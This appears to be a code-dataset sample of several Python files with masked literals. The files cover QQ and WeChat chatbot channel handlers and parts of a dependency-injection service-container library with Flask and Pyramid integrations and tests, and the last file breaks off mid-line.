<s> from channel . channel import Channel <EOL> from aiocqhttp import CQHttp , Event <EOL> from common import log <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> bot = CQHttp ( api_root = '<STR_LIT>' ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> @ bot . on_message ( '<STR_LIT>' ) <EOL> def handle_private_msg ( event : Event ) : <EOL> log . info ( "<STR_LIT>" , event ) <EOL> QQChannel ( ) . handle ( event ) <EOL> @ bot . on_message ( '<STR_LIT>' ) <EOL> def handle_private_msg ( event : Event ) : <EOL> log . info ( "<STR_LIT>" , event ) <EOL> QQChannel ( ) . handle_group ( event ) <EOL> class QQChannel ( Channel ) : <EOL> def startup ( self ) : <EOL> bot . run ( host = '<STR_LIT>' , port = <NUM_LIT> ) <EOL> def handle ( self , msg ) : <EOL> thread_pool . submit ( self . _do_handle , msg ) <EOL> def _do_handle ( self , msg ) : <EOL> context = dict ( ) <EOL> log . info ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> context [ '<STR_LIT>' ] = msg . user_id <EOL> reply_text = super ( ) . build_reply_content ( msg . message , context ) <EOL> bot . sync . send_private_msg ( user_id = msg . user_id , message = reply_text ) <EOL> def handle_group ( self , msg ) : <EOL> thread_pool . submit ( self . _do_handle_group , msg ) <EOL> def _do_handle_group ( self , msg ) : <EOL> context = dict ( ) <EOL> if msg . message and msg . message . find ( '<STR_LIT>' ) : <EOL> receiver = msg . message . split ( '<STR_LIT>' ) [ <NUM_LIT> ] . split ( '<STR_LIT>' ) [ <NUM_LIT> ] <EOL> if receiver == str ( msg [ '<STR_LIT>' ] ) : <EOL> text_list = msg . message . split ( '<STR_LIT>' , <NUM_LIT> ) <EOL> if len ( text_list ) == <NUM_LIT> and len ( text_list [ <NUM_LIT> ] ) > <NUM_LIT> : <EOL> query = text_list [ <NUM_LIT> ] . strip ( ) <EOL> context [ '<STR_LIT>' ] = str ( msg . user_id ) <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> reply_text = '<STR_LIT>' + str ( msg . user_id ) + '<STR_LIT>' + reply_text <EOL> bot . sync . send_group_msg ( group_id = msg [ '<STR_LIT>' ] , message = reply_text ) <EOL> </s>
<s> import werobot <EOL> import time <EOL> from config import channel_conf <EOL> from common import const <EOL> from common . log import logger <EOL> from channel . channel import Channel <EOL> from concurrent . futures import ThreadPoolExecutor <EOL> import os <EOL> robot = werobot . WeRoBot ( token = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) ) <EOL> thread_pool = ThreadPoolExecutor ( max_workers = <NUM_LIT> ) <EOL> cache = { } <EOL> @ robot . text <EOL> def hello_world ( msg ) : <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' , encoding = '<STR_LIT>' ) as f : <EOL> sensitive_words = [ line . strip ( ) for line in f . readlines ( ) ] <EOL> found = False <EOL> for word in sensitive_words : <EOL> if word != '<STR_LIT>' and word in msg . content : <EOL> found = True <EOL> break <EOL> if found : <EOL> return "<STR_LIT>" <EOL> else : <EOL> logger . info ( '<STR_LIT>' . format ( msg . content , msg . source ) ) <EOL> key = msg . content + '<STR_LIT>' + msg . source <EOL> if cache . get ( key ) : <EOL> cache . get ( key ) [ '<STR_LIT>' ] += <NUM_LIT> <EOL> return WechatSubsribeAccount ( ) . handle ( msg ) <EOL> class WechatSubsribeAccount ( Channel ) : <EOL> def startup ( self ) : <EOL> logger . info ( '<STR_LIT>' ) <EOL> robot . config [ '<STR_LIT>' ] = channel_conf ( const . WECHAT_MP ) . get ( '<STR_LIT>' ) <EOL> robot . config [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> robot . run ( ) <EOL> def handle ( self , msg , count = <NUM_LIT> ) : <EOL> if msg . content == "<STR_LIT>" : <EOL> return self . get_un_send_content ( msg . source ) <EOL> context = dict ( ) <EOL> context [ '<STR_LIT>' ] = msg . source <EOL> key = msg . content + '<STR_LIT>' + msg . source <EOL> res = cache . get ( key ) <EOL> if not res : <EOL> cache [ key ] = { "<STR_LIT>" : "<STR_LIT>" , "<STR_LIT>" : <NUM_LIT> } <EOL> thread_pool . submit ( self . _do_send , msg . content , context ) <EOL> res = cache . get ( key ) <EOL> logger . info ( "<STR_LIT>" . format ( count , res ) ) <EOL> if res . get ( '<STR_LIT>' ) == '<STR_LIT>' : <EOL> res [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> cache . pop ( key ) <EOL> return res . get ( "<STR_LIT>" ) <EOL> if cache . get ( key ) [ '<STR_LIT>' ] == <NUM_LIT> and count >= <NUM_LIT> : <EOL> logger . info ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> if count <= <NUM_LIT> : <EOL> time . sleep ( <NUM_LIT> ) <EOL> if count == <NUM_LIT> : <EOL> return None <EOL> return self . handle ( msg , count + <NUM_LIT> ) <EOL> def _do_send ( self , query , context ) : <EOL> key = query + '<STR_LIT>' + context [ '<STR_LIT>' ] <EOL> reply_text = super ( ) . build_reply_content ( query , context ) <EOL> logger . info ( '<STR_LIT>' . format ( reply_text ) ) <EOL> cache [ key ] [ '<STR_LIT>' ] = "<STR_LIT>" <EOL> cache [ key ] [ '<STR_LIT>' ] = reply_text <EOL> def get_un_send_content ( self , from_user_id ) : <EOL> for key in cache : <EOL> if from_user_id in key : <EOL> value = cache [ key ] <EOL> if value . get ( '<STR_LIT>' ) == "<STR_LIT>" : <EOL> cache . pop ( key ) <EOL> return value . get ( "<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> return "<STR_LIT>" <EOL> </s>
<s> from common import const <EOL> def create_channel ( channel_type ) : <EOL> if channel_type == const . TERMINAL : <EOL> from channel . terminal . terminal_channel import TerminalChannel <EOL> return TerminalChannel ( ) <EOL> if channel_type == const . WECHAT : <EOL> from channel . wechat . wechat_channel import WechatChannel <EOL> return WechatChannel ( ) <EOL> elif channel_type == const . WECHAT_MP : <EOL> from channel . wechat . wechat_mp_channel import WechatSubsribeAccount <EOL> return WechatSubsribeAccount ( ) <EOL> elif channel_type == const . WECHAT_MP_SERVICE : <EOL> from channel . wechat . wechat_mp_service_channel import WechatServiceAccount <EOL> return WechatServiceAccount ( ) <EOL> elif channel_type == const . WECHAT_COM : <EOL> from channel . wechat . wechat_com_channel import WechatEnterpriseChannel <EOL> return WechatEnterpriseChannel ( ) <EOL> elif channel_type == const . QQ : <EOL> from channel . qq . qq_channel import QQChannel <EOL> return QQChannel ( ) <EOL> elif channel_type == const . GMAIL : <EOL> from channel . gmail . gmail_channel import GmailChannel <EOL> return GmailChannel ( ) <EOL> elif channel_type == const . TELEGRAM : <EOL> from channel . telegram . telegram_channel import TelegramChannel <EOL> return TelegramChannel ( ) <EOL> elif channel_type == const . SLACK : <EOL> from channel . slack . slack_channel import SlackChannel <EOL> return SlackChannel ( ) <EOL> elif channel_type == const . HTTP : <EOL> from channel . http . http_channel import HttpChannel <EOL> return HttpChannel ( ) <EOL> elif channel_type == const . DINGTALK : <EOL> from channel . dingtalk . dingtalk_channel import DingTalkChannel <EOL> return DingTalkChannel ( ) <EOL> elif channel_type == const . FEISHU : <EOL> from channel . feishu . feishu_channel import FeiShuChannel <EOL> return FeiShuChannel ( ) <EOL> elif channel_type == const . DISCORD : <EOL> from channel . discord . discord_channel import DiscordChannel <EOL> return DiscordChannel ( ) <EOL> else : <EOL> raise RuntimeError ( "<STR_LIT>" + channel_type ) <EOL> </s>
<s> class Plugin : <EOL> def __init__ ( self ) : <EOL> self . handlers = { } <EOL> def get_help_text ( self , ** kwargs ) : <EOL> return "<STR_LIT>" <EOL> </s>
<s> import asyncio <EOL> from contextlib import asynccontextmanager , contextmanager <EOL> def int_factory ( ) : <EOL> return <NUM_LIT> <EOL> def str_gen_factory ( ) : <EOL> yield "<STR_LIT>" <EOL> @ contextmanager <EOL> def bool_cm_factory ( ) : <EOL> yield True <EOL> async def async_int_factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> return <NUM_LIT> <EOL> async def async_str_gen_factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> yield str ( <NUM_LIT> ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> @ asynccontextmanager <EOL> async def async_bool_cm_factory ( ) : <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> yield True <EOL> </s>
<s> import sys <EOL> from typing import AsyncGenerator , Generator <EOL> import pytest <EOL> from . fake_factories import ( <EOL> async_int_factory , <EOL> async_str_gen_factory , <EOL> int_factory , <EOL> str_gen_factory , <EOL> ) <EOL> from . helpers import nop <EOL> def test_nop ( ) : <EOL> assert None is nop ( ) <EOL> assert None is nop ( <NUM_LIT> ) <EOL> assert None is nop ( <NUM_LIT> , x = <NUM_LIT> ) <EOL> def test_int_factory ( ) : <EOL> assert isinstance ( int_factory ( ) , int ) <EOL> def test_str_cleanup_factory ( ) : <EOL> gen = str_gen_factory ( ) <EOL> assert isinstance ( gen , Generator ) <EOL> assert isinstance ( next ( gen ) , str ) <EOL> with pytest . raises ( StopIteration ) : <EOL> next ( gen ) <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_async_int_factory ( ) : <EOL> assert isinstance ( await async_int_factory ( ) , int ) <EOL> @ pytest . mark . asyncio ( ) <EOL> async def test_async_str_cleanup_factory ( ) : <EOL> gen = async_str_gen_factory ( ) <EOL> assert isinstance ( gen , AsyncGenerator ) <EOL> assert isinstance ( await anext ( gen ) , str ) <EOL> with pytest . raises ( StopAsyncIteration ) : <EOL> await anext ( gen ) <EOL> if sys . version_info < ( <NUM_LIT> , <NUM_LIT> ) : <EOL> def anext ( gen : AsyncGenerator ) : <EOL> return gen . __anext__ ( ) <EOL> </s>
<s> from __future__ import annotations <EOL> from collections . abc import Callable <EOL> from typing import Any , TypeVar , cast , overload <EOL> from flask import Flask , current_app , g , has_app_context <EOL> from flask . ctx import _AppCtxGlobals <EOL> from werkzeug . local import LocalProxy <EOL> from . _core import ( <EOL> _KEY_CONTAINER , <EOL> _KEY_REGISTRY , <EOL> T1 , <EOL> T2 , <EOL> T3 , <EOL> T4 , <EOL> T5 , <EOL> T6 , <EOL> T7 , <EOL> T8 , <EOL> T9 , <EOL> T10 , <EOL> Container , <EOL> Registry , <EOL> ServicePing , <EOL> ) <EOL> def svcs_from ( g : _AppCtxGlobals = g ) -> Container : <EOL> if ( con := g . get ( _KEY_CONTAINER , None ) ) is None : <EOL> con = Container ( current_app . extensions [ _KEY_REGISTRY ] ) <EOL> setattr ( g , _KEY_CONTAINER , con ) <EOL> return con <EOL> def get_registry ( app : Flask | None = None ) -> Registry : <EOL> if app is None : <EOL> app = current_app <EOL> return app . extensions [ _KEY_REGISTRY ] <EOL> registry = cast ( Registry , LocalProxy ( get_registry ) ) <EOL> container = cast ( Container , LocalProxy ( svcs_from ) ) <EOL> FlaskAppT = TypeVar ( "<STR_LIT>" , bound = Flask ) <EOL> def init_app ( app : FlaskAppT , * , registry : Registry | None = None ) -> FlaskAppT : <EOL> app . extensions [ _KEY_REGISTRY ] = registry or Registry ( ) <EOL> app . teardown_appcontext ( teardown ) <EOL> return app <EOL> def get_abstract ( * svc_types : type ) -> Any : <EOL> return get ( * svc_types ) <EOL> def register_factory ( <EOL> app : Flask , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> app . extensions [ _KEY_REGISTRY ] . register_factory ( <EOL> svc_type , <EOL> factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def register_value ( <EOL> app : Flask , <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = False , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> app . extensions [ _KEY_REGISTRY ] . register_value ( <EOL> svc_type , <EOL> value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> def overwrite_factory ( <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> container = svcs_from ( ) <EOL> container . registry . register_factory ( <EOL> svc_type , <EOL> factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> container . close ( ) <EOL> def overwrite_value ( <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | None = None , <EOL> ) -> None : <EOL> container = svcs_from ( ) <EOL> container . registry . register_value ( <EOL> svc_type , <EOL> value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> container . close ( ) <EOL> def get_pings ( ) -> list [ ServicePing ] : <EOL> return svcs_from ( g ) . get_pings ( ) <EOL> def teardown ( exc : BaseException | None ) -> None : <EOL> if has_app_context ( ) and ( container := g . pop ( _KEY_CONTAINER , None ) ) : <EOL> container . close ( ) <EOL> def close_registry ( app : Flask ) -> None : <EOL> if reg := app . extensions . pop ( _KEY_REGISTRY , None ) : <EOL> reg . close ( ) <EOL> @ overload <EOL> def get ( svc_type : type [ T1 ] , / ) -> T1 : ... <EOL> @ overload <EOL> def get ( svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , / ) -> tuple [ T1 , T2 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , svc_type2 : type [ T2 ] , svc_type3 : type [ T3 ] , / <EOL> ) -> tuple [ T1 , T2 , T3 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 ] : ... <EOL> @ overload <EOL> def get ( <EOL> svc_type1 : type [ T1 ] , <EOL> svc_type2 : type [ T2 ] , <EOL> svc_type3 : type [ T3 ] , <EOL> svc_type4 : type [ T4 ] , <EOL> svc_type5 : type [ T5 ] , <EOL> svc_type6 : type [ T6 ] , <EOL> svc_type7 : type [ T7 ] , <EOL> svc_type8 : type [ T8 ] , <EOL> svc_type9 : type [ T9 ] , <EOL> svc_type10 : type [ T10 ] , <EOL> / , <EOL> ) -> tuple [ T1 , T2 , T3 , T4 , T5 , T6 , T7 , T8 , T9 , T10 ] : ... <EOL> def get ( * svc_types : type ) -> object : <EOL> return svcs_from ( g ) . get ( * svc_types ) <EOL> </s>
<s> from __future__ import annotations <EOL> from typing import Generator <EOL> import pyramid <EOL> from pyramid . config import Configurator <EOL> import svcs <EOL> def factory_with_cleanup ( ) -> Generator [ int , None , None ] : <EOL> yield <NUM_LIT> <EOL> config = Configurator ( settings = { } ) <EOL> svcs . pyramid . init ( config ) <EOL> svcs . pyramid . register_value ( config , int , <NUM_LIT> ) <EOL> svcs . pyramid . register_value ( config , int , <NUM_LIT> , ping = lambda : None ) <EOL> svcs . pyramid . register_factory ( config , str , str ) <EOL> svcs . pyramid . register_factory ( config , int , factory_with_cleanup ) <EOL> svcs . pyramid . register_value ( config , str , str , ping = lambda : None ) <EOL> req = pyramid . request . Request ( ) <EOL> o1 : object = svcs . pyramid . get ( req , object ) <EOL> o2 : int = svcs . pyramid . get_abstract ( req , object ) <EOL> a : int <EOL> b : str <EOL> c : bool <EOL> d : tuple <EOL> e : object <EOL> f : float <EOL> g : list <EOL> h : dict <EOL> i : set <EOL> j : bytes <EOL> a , b , c , d , e , f , g , h , i , j = svcs . pyramid . get ( <EOL> req , int , str , bool , tuple , object , float , list , dict , set , bytes <EOL> ) <EOL> pings : list [ svcs . ServicePing ] = svcs . pyramid . get_pings ( req ) <EOL> reg : svcs . Registry = svcs . pyramid . get_registry ( config ) <EOL> reg = svcs . pyramid . get_registry ( ) <EOL> con : svcs . Container = svcs . pyramid . svcs_from ( ) <EOL> con = svcs . pyramid . svcs_from ( req ) <EOL> svcs . pyramid . close_registry ( config ) <EOL> </s>
<s> from __future__ import annotations <EOL> import inspect <EOL> import logging <EOL> import warnings <EOL> from collections . abc import Callable <EOL> from contextlib import ( <EOL> AbstractAsyncContextManager , <EOL> AbstractContextManager , <EOL> asynccontextmanager , <EOL> contextmanager , <EOL> suppress , <EOL> ) <EOL> from inspect import ( <EOL> isasyncgenfunction , <EOL> isawaitable , <EOL> iscoroutine , <EOL> iscoroutinefunction , <EOL> isgeneratorfunction , <EOL> ) <EOL> from types import TracebackType <EOL> from typing import Any , Awaitable , TypeVar , overload <EOL> import attrs <EOL> from . exceptions import ServiceNotFoundError <EOL> log = logging . getLogger ( "<STR_LIT>" ) <EOL> def _full_name ( obj : object ) -> str : <EOL> try : <EOL> return f"<STR_LIT>" <EOL> except AttributeError : <EOL> return repr ( obj ) <EOL> _KEY_REGISTRY = "<STR_LIT>" <EOL> _KEY_CONTAINER = "<STR_LIT>" <EOL> @ attrs . frozen <EOL> class RegisteredService : <EOL> svc_type : type <EOL> factory : Callable = attrs . field ( hash = False ) <EOL> takes_container : bool <EOL> enter : bool <EOL> ping : Callable | None = attrs . field ( hash = False ) <EOL> @ property <EOL> def name ( self ) -> str : <EOL> return _full_name ( self . svc_type ) <EOL> def __repr__ ( self ) -> str : <EOL> return ( <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> "<STR_LIT>" <EOL> ) <EOL> @ attrs . frozen <EOL> class ServicePing : <EOL> name : str <EOL> is_async : bool <EOL> _svc_type : type <EOL> _ping : Callable <EOL> _container : Container <EOL> def ping ( self ) -> None : <EOL> svc : Any = self . _container . get ( self . _svc_type ) <EOL> self . _ping ( svc ) <EOL> async def aping ( self ) -> None : <EOL> svc : Any = await self . _container . aget ( self . _svc_type ) <EOL> if self . is_async : <EOL> await self . _ping ( svc ) <EOL> else : <EOL> self . _ping ( svc ) <EOL> @ attrs . define <EOL> class Registry : <EOL> _services : dict [ type , RegisteredService ] = attrs . Factory ( dict ) <EOL> _on_close : list [ tuple [ str , Callable | Awaitable ] ] = attrs . Factory ( list ) <EOL> def __repr__ ( self ) -> str : <EOL> return f"<STR_LIT>" <EOL> def __contains__ ( self , svc_type : type ) -> bool : <EOL> return svc_type in self . _services <EOL> def __enter__ ( self ) -> Registry : <EOL> return self <EOL> def __exit__ ( <EOL> self , <EOL> exc_type : type [ BaseException ] | None , <EOL> exc_val : BaseException | None , <EOL> exc_tb : TracebackType | None , <EOL> ) -> None : <EOL> self . close ( ) <EOL> async def __aenter__ ( self ) -> Registry : <EOL> return self <EOL> async def __aexit__ ( <EOL> self , <EOL> exc_type : type [ BaseException ] | None , <EOL> exc_val : BaseException | None , <EOL> exc_tb : TracebackType | None , <EOL> ) -> None : <EOL> await self . aclose ( ) <EOL> def __del__ ( self ) -> None : <EOL> if getattr ( self , "<STR_LIT>" , None ) : <EOL> warnings . warn ( <EOL> "<STR_LIT>" , <EOL> ResourceWarning , <EOL> stacklevel = <NUM_LIT> , <EOL> ) <EOL> def register_factory ( <EOL> self , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> * , <EOL> enter : bool = True , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | Awaitable | None = None , <EOL> ) -> None : <EOL> rs = self . _register_factory ( <EOL> svc_type , <EOL> factory , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> log . debug ( <EOL> "<STR_LIT>" , <EOL> factory , <EOL> rs . name , <EOL> extra = { <EOL> "<STR_LIT>" : rs . name , <EOL> "<STR_LIT>" : _full_name ( factory ) , <EOL> } , <EOL> stack_info = True , <EOL> ) <EOL> def register_value ( <EOL> self , <EOL> svc_type : type , <EOL> value : object , <EOL> * , <EOL> enter : bool = False , <EOL> ping : Callable | None = None , <EOL> on_registry_close : Callable | Awaitable | None = None , <EOL> ) -> None : <EOL> rs = self . _register_factory ( <EOL> svc_type , <EOL> lambda : value , <EOL> enter = enter , <EOL> ping = ping , <EOL> on_registry_close = on_registry_close , <EOL> ) <EOL> log . debug ( <EOL> "<STR_LIT>" , <EOL> value , <EOL> rs . name , <EOL> extra = { "<STR_LIT>" : rs . name , "<STR_LIT>" : value } , <EOL> stack_info = True , <EOL> ) <EOL> def _register_factory ( <EOL> self , <EOL> svc_type : type , <EOL> factory : Callable , <EOL> enter : bool , <EOL> ping : Callable | None , <EOL> on_registry_close : Callable | Awaitable | None = None , <EOL> ) -> RegisteredService : <EOL> if isgeneratorfunction ( factory ) : <EOL> factory = contextmanager ( factory ) <EOL> elif isasyncgenfunction ( factory ) : <EOL> factory = asynccontextmanager ( factory ) <EOL> rs = RegisteredService ( <EOL> svc_type , factory , _takes_container ( factory ) , enter , ping <EOL> ) <EOL> self . _services [ svc_type ] = rs <EOL> if on_registry_close is not None : <EOL> self . _on_close . append ( ( rs . name , on_registry_close ) ) <EOL> return rs <EOL> def get_registered_service_for ( self , svc_type : type ) -> RegisteredService : <EOL> try : <EOL> return self . _services [ svc_type ] <EOL> except KeyError : <EOL> raise ServiceNotFoundError ( svc_type ) from None <EOL> def close ( self ) -> None : <EOL> for name , oc in reversed ( self . _on_close ) : <EOL> if iscoroutinefunction ( oc ) or isawaitable ( oc ) : <EOL> warnings . warn ( <EOL> f"<STR_LIT>" <EOL> "<STR_LIT>" , <EOL> stacklevel = <NUM_LIT> , <EOL> ) <EOL> continue <EOL> try : <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> oc ( ) <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> except Exception : <EOL> log . warning ( <EOL> "<STR_LIT>" , <EOL> name , <EOL> exc_info = True , <EOL> extra = { "<STR_LIT>" : name } , <EOL> ) <EOL> self . _services . clear ( ) <EOL> self . _on_close . clear ( ) <EOL> async def aclose ( self ) -> None : <EOL> for name , oc in reversed ( self . _on_close ) : <EOL> try : <EOL> if iscoroutinefunction ( oc ) : <EOL> oc = oc ( ) <EOL> if isawaitable ( oc ) : <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> await oc <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> else : <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> oc ( ) <EOL> log . debug ( "<STR_LIT>" , name ) <EOL> except Exception : <EOL> log . warning ( <EOL> "<STR_LIT>" , <EOL> name , <EOL> exc_info = True , <EOL> extra = { "<STR_LIT>" : name } , <EOL> ) <EOL> self . _services . clear ( ) <EOL> self . _on_close . clear ( ) <EOL> def _takes_container ( factory : Callable ) -> bool : <EOL> try : <EOL> sig = inspect . signature ( <EOL> factory , locals = { "<STR_LIT>" : Container } , eval_str = True <EOL> ) <EOL> except Exception : <EOL> try : <EOL> sig = inspect . signature ( factory ) <EOL> except Exception : <EOL> return False <EOL> if not sig . parameters : <EOL> return False <EOL> if len ( sig . parameters ) != <NUM_LIT> : <EOL> msg = "<STR_LIT>" <EOL> raise TypeError ( msg ) <EOL> ( ( name , p ) , ) = tuple ( sig . parameters . items ( ) ) <EOL> return ( <EOL> name == "<STR_LIT>" <EOL> or p . annotation is Container <EOL> or p . annotation == "<STR_LIT>" <EOL> or p . annotation == "<STR_LIT>" <EOL> ) <EOL> T1 = TypeVar ( "<STR_LIT>" ) <EOL> T2 = TypeVar ( "<STR_LIT>" ) <EOL> T3 = TypeVar ( "<STR_LIT>" ) <EOL> T4 = TypeVar ( "<STR_LIT>" ) <EOL> T5 = TypeVar ( "<STR_LIT>" ) <EOL> T6 = TypeVar ( "<STR_LIT>" ) <EOL> T7 = TypeVar ( "<STR_LIT>" ) <EOL> T8 = TypeVar ( "<STR_LIT>" ) <EOL> T9 = TypeVar ( "<STR_LIT>" ) <EOL> T10 = TypeVar ( "<STR_LIT>" ) <EOL> @ attrs . define <EOL> class Container : <EOL> registry : Registry <EOL> _lazy_local_registry : Registry | None = None <EOL> _instantiated : dict [ type , object ] = attrs . Factory ( dict ) <EOL> _on_close : list [ <EOL> tuple [ str , AbstractContextManager | AbstractAsyncContextManager ] <EOL> ] = attrs . Factory ( list ) <EOL> def __repr__ ( self ) -> str : <EOL> return ( <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> ) <EOL> def __contains__ ( self , svc_type : type ) -> bool : <EOL> return svc_type in self . _instantiated <EOL> def __enter__ ( self ) -> Container : <EOL> return self <EOL> def __exit__ ( <EOL> self , <EOL> exc_type : type [ BaseException ] | None , <EOL> exc_val : BaseException | None , <EOL> exc_tb : TracebackType | None , <EOL> ) -> None : <EOL> self . close ( ) <EOL> async def __aenter__ ( self ) -> Container : <EOL> return self <EOL> async def __aexit__ ( <EOL> self , <EOL> exc_type : type [ BaseException ] | None , <EOL> exc_val : BaseException | None , <EOL> exc_tb : TracebackType | None , <EOL> ) -> None : <EOL> await self . aclose ( ) <EOL> def __del__ ( self ) -> None : <EOL> if getattr ( self , "<STR_LIT>" , None ) : <EOL> warnings . warn ( <EOL> "<STR_LIT>" , <EOL> ResourceWarning , <EOL> stacklevel = <NUM_LIT> , <EOL> ) <EOL> def close ( self ) -> None : <EOL> for name , cm in reversed ( self . _on_close ) : <EOL> try : <EOL> if isinstance ( cm , AbstractAsyncContextManager ) : <EOL> warnings . warn ( <EOL> f"<STR_LIT>" <EOL> "<STR_LIT>" , <EOL> stacklevel = <NUM_LIT> , <EOL> ) <EOL> continue <EOL> cm . __exit__ ( None , None , None ) <EOL> except Exception : <EOL> log . warning ( <EOL> "<STR_LIT>" , <EOL> name , <EOL> exc_info = True , <EOL> extra = { "<STR_LIT>" : name } , <EOL> ) <EOL> if self . _lazy_local_registry is not None : <EOL> self . _lazy_local_registry . close ( ) <EOL> self . _on_close . clear ( ) <EOL> self . _instantiated . clear ( ) <EOL> async def aclose ( self ) -> None : <EOL> for name , cm in reversed ( self . _on_close ) : <EOL> try : <EOL> if isinstance ( cm , AbstractContextManager ) : <EOL> cm . __exit__ ( None , None , None ) <EOL> else : <EOL> await cm . __aexit__ ( None , None , None ) <EOL> except Exception : <EOL> log . warning ( <EOL> "<STR_LIT>" , <EOL> name , <EOL> exc_info = True , <EOL> extra = { "<STR_LIT>" : name } , <EOL> ) <EOL> if self . _lazy_local_registry is not None : <EOL> await self . _lazy_local_registry . aclose ( ) <EOL> self . _on_close . clear ( ) <EOL> self . _instantiated . clear ( ) <EOL> def get_pings ( self ) -> list [ ServicePing ] : <EOL> return [ <EOL> ServicePing ( <EOL> rs . name , <EOL> iscoroutinefunction ( rs . ping ) , <EOL> rs . svc_type , <EOL> rs . ping , <EOL> self , <EOL> ) <EOL> for rs in self . registry . _services . values ( ) <EOL> if rs . ping is not None <EOL> ] <EOL> def get_abstract ( self , * svc_types : type ) -> Any : <EOL> return self . get ( * svc_types ) <EOL> async def aget_abstract ( self , * svc_types : type ) -> Any : <EOL> return await self . aget ( * svc_types ) <EOL> def _lookup ( self , svc_type : type ) -> tuple [ bool , object , str , bool ] : <EOL> if ( <EOL> svc := self . _instantiated . get ( svc_type , attrs . NOTHING ) <EOL> ) is not attrs . NOTHING : <EOL> return True , svc , "<STR_LIT>" , False <EOL> rs = None <EOL> if self . _lazy_local_registry is not None : <EOL> with suppress ( ServiceNotFoundError ) : <EOL> rs = self . _lazy_local_registry . get_registered_service_for ( <EOL> svc_type <EOL> ) <EOL> if rs is None : <EOL> rs = self . registry . 